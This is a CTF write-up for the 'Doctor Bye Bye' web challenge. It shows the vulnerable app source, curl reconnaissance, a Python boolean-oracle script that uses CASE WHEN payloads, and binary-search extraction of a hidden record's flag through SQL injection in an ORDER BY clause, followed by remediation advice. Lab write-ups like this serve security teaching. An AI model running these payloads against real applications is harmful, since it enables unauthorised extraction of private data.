Doctor Bye Bye — SQL Injection in ORDER BY Clause via Boolean Oracle | FortID CTF
Challenge: Doctor Bye Bye  
Platform: FortID CTF (inst8.ctf.fortid.com)  
Category: Web  
Flag Format: FortID{...}  
Author: Author name if known  
Date: October 2026  
Executive Summary
The challenge presents a hospital on-call board that explicitly states "retired records can never be displayed." The flag resides in a farewell_note column of a hidden doctor record (id=404, listed=0). The /api/on-call endpoint accepts a sort parameter that is directly interpolated into an ORDER BY clause without validation. By injecting a CASE WHEN expression, I converted the ordering behavior into a reliable boolean oracle: the first listed doctor changes depending on whether the injected condition evaluates true or false. This allowed full extraction of the 36-character flag via binary search on each character's Unicode code point.
Challenge Overview
Dr. Bye Bye has retired from St. Codd's Hospital.

The hospital insists that retired records can never be displayed. Can you recover Dr. Bye Bye's private farewell note anyway?
The service runs at https://doctor-bye-bye-0e55e52ed5c5.inst8.ctf.fortid.com. The flag is the farewell note of the retired doctor. The flag format is FortID{...}.
Environment and Tools
Tool	Purpose
curl / urllib (Python)	HTTP requests to the live endpoint
Python 3.12	Exploit scripting, binary search automation
SQLite 3 (local)	Verifying query behavior against the schema
Browser DevTools	Initial endpoint discovery and response inspection
No specialized frameworks or scanners were required; the vulnerability is exploitable with standard HTTP tooling.
Methodology and Reconnaissance
1. Objective: Map the attack surface
Action: Fetched the root page and the API endpoint with default parameters.
curl -s https://doctor-bye-bye-0e55e52ed5c5.inst8.ctf.fortid.com/
curl -s "https://doctor-bye-bye-0e55e52ed5c5.inst8.ctf.fortid.com/api/on-call?sort=name"
Evidence:
{"doctor":{"name":"Dr. Ada Pulse","specialty":"Cardiology","room":"C-101"}}
Interpretation: The endpoint returns a single doctor selected by ORDER BY sort LIMIT 1 from the doctors table where listed=1. The sort parameter is reflected directly into SQL.
2. Objective: Confirm injectability of sort
Action: Tested ordering by different columns and expressions.
curl -s "https://.../api/on-call?sort=id"
curl -s "https://.../api/on-call?sort=-id"
Evidence:
- sort=id → Dr. Ada Pulse (id=10, first by id ascending)
- sort=-id → Dr. Zoe Last (id=90, first by id descending)
Interpretation: Arbitrary SQL expressions in ORDER BY are accepted. The 600-character limit (app.py:122) is generous.
3. Objective: Understand the database schema
Action: Examined the provided source code (src/app.py).
Evidence (key excerpts):
# Lines 40-48: Schema
CREATE TABLE doctors (
    id INTEGER PRIMARY KEY,
    slug TEXT NOT NULL UNIQUE,
    name TEXT NOT NULL,
    specialty TEXT NOT NULL,
    room TEXT NOT NULL,
    listed INTEGER NOT NULL CHECK (listed IN (0, 1)),
    farewell_note TEXT
);

# Lines 50-60: Seed data
INSERT INTO doctors VALUES
    (10, 'ada-pulse', 'Dr. Ada Pulse', 'Cardiology', 'C-101', 1, NULL),
    (30, 'max-well', 'Dr. Max Well', 'Radiology', 'R-204', 1, NULL),
    (50, 'paige-turner', 'Dr. Paige Turner', 'Neurology', 'N-303', 1, NULL),
    (70, 'ella-ment', 'Dr. Ella Ment', 'Pathology', 'P-118', 1, NULL),
    (90, 'zoe-last', 'Dr. Zoe Last', 'Emergency medicine', 'E-001', 1, NULL);
INSERT INTO doctors VALUES (?, ?, ?, ?, ?, ?, ?)
    (404, "doctor-bye-bye", "Dr. Bye Bye", "Retired", "-", 0, flag);
# Lines 67-74: Query construction
def select_on_call(order_expression):
    query = f"""
        SELECT name, specialty, room
        FROM doctors
        WHERE listed = 1
        ORDER BY {order_expression}
        LIMIT 1
    """
Interpretation: The flag is stored in farewell_note for id=404, but listed=0 excludes it from the result set. The ORDER BY injection is the only path to extract it.
Vulnerability Analysis
Affected Component
/api/on-call endpoint, sort query parameter → select_on_call() → raw interpolation into ORDER BY.
Root Cause
The application constructs SQL via f-string without validation or parameterization:
query = f"""
    SELECT name, specialty, room
    FROM doctors
    WHERE listed = 1
    ORDER BY {order_expression}
    LIMIT 1
"""
SQLite permits expressions in ORDER BY, including CASE WHEN ... THEN ... ELSE ... END. The listed=1 filter prevents direct selection of the retired doctor, but the ordering expression can reference any column or subquery.
Exploitable Behavior
The query returns the first row after ordering. With five listed doctors (ids 10, 30, 50, 70, 90):
- ORDER BY id ASC → Dr. Ada Pulse (id=10)
- ORDER BY id DESC → Dr. Zoe Last (id=90)
Injecting CASE WHEN <condition> THEN id ELSE -id END flips the effective sort direction based on <condition>. The API response reveals which branch was taken:
Condition Result	First Doctor Returned
TRUE  (ascending)	Dr. Ada Pulse
FALSE (descending)	Dr. Zoe Last
This is a clean 1-bit boolean oracle with no error messages, time delays, or side channels required.
Prerequisites and Limitations
- sort length ≤ 600 characters (sufficient for CASE WHEN payloads)
- SQLite limits: SQLITE_LIMIT_LENGTH=1MiB, SQLITE_LIMIT_SQL_LENGTH=2048, VM budget 50k operations — not restrictive for this exploit
- No authentication, rate limiting, or WAF observed
Exploitation Walkthrough
Step 1: Build the Oracle Function
import urllib.request, urllib.parse

BASE = "https://doctor-bye-bye-0e55e52ed5c5.inst8.ctf.fortid.com/api/on-call"

def oracle(condition: str) -> bool:
    """
    Returns True if condition evaluates to TRUE (Ada Pulse returned),
    False if FALSE (Zoe Last returned).
    """
    payload = f"CASE WHEN ({condition}) THEN id ELSE -id END"
    url = BASE + "?sort=" + urllib.parse.quote(payload, safe="")
    with urllib.request.urlopen(url, timeout=15) as r:
        data = r.read().decode()
    if "Ada Pulse" in data:
        return True
    elif "Zoe Last" in data:
        return False
    else:
        raise RuntimeError(f"Unexpected response: {data[:200]}")
Verification:
>>> oracle("1=1")
True
>>> oracle("1=2")
False
Step 2: Determine Flag Length
Binary search on length(farewell_note) using the > operator.
low, high = 0, 128
while low < high:
    mid = (low + high) // 2
    if oracle(f"length((SELECT farewell_note FROM doctors WHERE id=404))>{mid}"):
        low = mid + 1
    else:
        high = mid
# low == 36
Evidence:
len>64? False
len>32? True
len>48? False
len>40? False
len>36? False
len>34? True
len>35? True
[*] length = 36
[*] length==36? True
Step 3: Extract Each Character
For positions 1–36, binary search the Unicode code point (printable ASCII 32–126).
flag = ""
for pos in range(1, 37):
    low, high = 31, 127  # invariant: >low is True, >high is False
    while high - low > 1:
        mid = (low + high) // 2
        cond = f"unicode(substr((SELECT farewell_note FROM doctors WHERE id=404),{pos},1))>{mid}"
        if oracle(cond):
            low = mid
        else:
            high = mid
    flag += chr(high)
    print(f"pos {pos}: {high} = {chr(high)!r}  -> {flag!r}")
Evidence (excerpt):
pos 1: 70 = 'F'  -> 'F'
pos 2: 111 = 'o' -> 'Fo'
pos 3: 114 = 'r' -> 'For'
pos 4: 116 = 't' -> 'Fort'
pos 5: 73 = 'I'  -> 'FortI'
pos 6: 68 = 'D'  -> 'FortID'
pos 7: 123 = '{' -> 'FortID{'
...
pos 35: 50 = '2' -> 'FortID{D0C_1M_0UTT4_H3R3_939082bdc2'
pos 36: 125 = '}' -> 'FortID{D0C_1M_0UTT4_H3R3_939082bdc2}'
Step 4: Final Verification
Test the complete flag with an equality condition.
flag = "FortID{D0C_1M_0UTT4_H3R3_939082bdc2}"
cond = f"(SELECT farewell_note FROM doctors WHERE id=404)='{flag}'"
payload = f"CASE WHEN ({cond}) THEN id ELSE -id END"
# Returns Dr. Ada Pulse (True branch) → exact match confirmed
Evidence:
{"doctor":{"name":"Dr. Ada Pulse","specialty":"Cardiology","room":"C-101"}}
Flag Retrieval and Verification
Flag: FortID{D0C_1M_0UTT4_H3R3_939082bdc2}
Verified by:
1. Character-by-character extraction with boolean oracle
2. Full-string equality test returning the TRUE branch (Ada Pulse)
Root Cause and Remediation
Root Cause
Unvalidated user input interpolated directly into an ORDER BY clause. SQLite's expression support in ORDER BY allows CASE WHEN constructs that can reference arbitrary subqueries, bypassing the WHERE listed=1 filter's intent.
Remediation
Measure	Implementation
Allow-list validation	Accept only known column names: if sort not in {"name", "id", "specialty", "room"}: reject
Parameterized ordering	Map user input to a safe column: ORDER BY {"name": "name", "id": "id"}.get(sort, "name")
Defense in depth	Use sqlite3 parameterization where possible (not applicable to ORDER BY identifiers, but reinforces discipline)
The fix is a one-line allow list. No WAF or complex filtering needed.
CVE and Vulnerability References
No CVE applies. This is a classic SQL Injection in ORDER BY Clause (CWE-89) resulting from improper neutralization of special elements in a SQL command. The specific technique — boolean-based blind extraction via CASE WHEN in ORDER BY — is documented in:
- PortSwigger Web Security Academy: "SQL injection in ORDER BY clause"
- OWASP Testing Guide: "Testing for SQL Injection (OTG-INPVAL-005)"
Lessons Learned
1. ORDER BY is executable context. Many developers assume only WHERE/VALUES need parameterization. SQLite (and PostgreSQL, MySQL) evaluate expressions in ORDER BY, making them equally dangerous.
2. Boolean oracles don't need errors or time. A single-bit difference in application behavior (which row appears first) is sufficient for full data extraction.
3. Schema knowledge from source code accelerates exploitation. The handout revealed the exact column name (farewell_note), the target id (404), and the listed filter — turning a blind hunt into a precise extraction.
4. Length-then-char binary search is optimal. 36 chars × ~7 requests/char + length discovery ≈ 260 requests. Well within practical limits for a CTF challenge.
References
1. SQLite Documentation: ORDER BY Clause (https://www.sqlite.org/lang_select.html#orderby)
2. PortSwigger: SQL Injection in ORDER BY (https://portswigger.net/web-security/sql-injection/order-by)
3. OWASP: Testing for SQL Injection (https://owasp.org/www-project-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
4. CWE-89: Improper Neutralization of Special Elements used in an SQL Command (https://cwe.mitre.org/data/definitions/89.html)
Writeup prepared from verified live exploitation against https://doctor-bye-bye-0e55e52ed5c5.inst8.ctf.fortid.com and the provided source code handout.
